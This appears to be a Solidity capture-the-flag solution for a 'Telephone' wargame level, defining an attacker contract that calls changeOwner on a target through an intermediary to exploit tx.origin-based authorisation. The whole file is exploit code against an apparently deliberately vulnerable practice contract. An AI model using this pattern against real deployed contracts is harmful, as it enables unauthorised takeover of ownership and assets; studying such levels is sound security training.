// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address) external ;
}
contract TelephonAttacker {

  function attack(address contract_addr, address new_owner_address) public {
    // call telephone contract
    Telephone(contract_addr).changeOwner(new_owner_address);
  }
}